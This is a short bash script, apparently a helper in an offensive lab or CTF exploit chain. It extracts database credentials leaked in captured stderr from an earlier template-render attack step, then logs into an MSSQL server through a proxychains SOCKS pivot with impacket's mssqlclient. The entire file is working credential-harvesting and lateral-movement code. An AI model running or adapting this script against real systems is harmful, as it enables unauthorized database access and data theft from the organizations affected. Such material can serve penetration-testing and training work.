#!/usr/bin/env bash
set -euo pipefail

source "$(dirname -- "${BASH_SOURCE[0]}")/common.sh"

db_user=${AEGIS_RENDER_DB_USER:-}
db_pass=${AEGIS_RENDER_DB_PASS:-}
db_host=${AEGIS_RENDER_DB_HOST:-}
db_name=${AEGIS_RENDER_DB_DB:-}
db_port=${AEGIS_RENDER_DB_PORT:-}

source_body="$odyssey_root/responses/template-render-render-env.body"
if [[ -f "$source_body" ]]; then
  mapfile -t env_lines < <(
    jq -r '.stages[]|.stderr//empty' "$source_body" |
      sed -n 's/^FILELINE:[0-9][0-9]*:\(AEGIS_RENDER_DB_[A-Z]*=.*\)[[:space:]]*$/\1/p' |
      awk '!seen[$0]++'
  )
  for item in "${env_lines[@]}"; do
    key=${item%%=*}
    value=${item#*=}
    value=${value%"${value##*[![:space:]]}"}
    case "$key" in
      AEGIS_RENDER_DB_USER) db_user=${db_user:-$value} ;;
      AEGIS_RENDER_DB_PASS) db_pass=${db_pass:-$value} ;;
      AEGIS_RENDER_DB_HOST) db_host=${db_host:-$value} ;;
      AEGIS_RENDER_DB_DB) db_name=${db_name:-$value} ;;
      AEGIS_RENDER_DB_PORT) db_port=${db_port:-$value} ;;
    esac
  done
fi

: "${db_user:?}" "${db_pass:?}" "${db_host:?}" "${db_name:?}" "${db_port:?}"
require_socks
exec proxychains4 -q "$script_dir/impacket-example.sh" mssqlclient \
  -db "$db_name" -port "$db_port" "$db_user:$db_pass@$db_host" "$@"
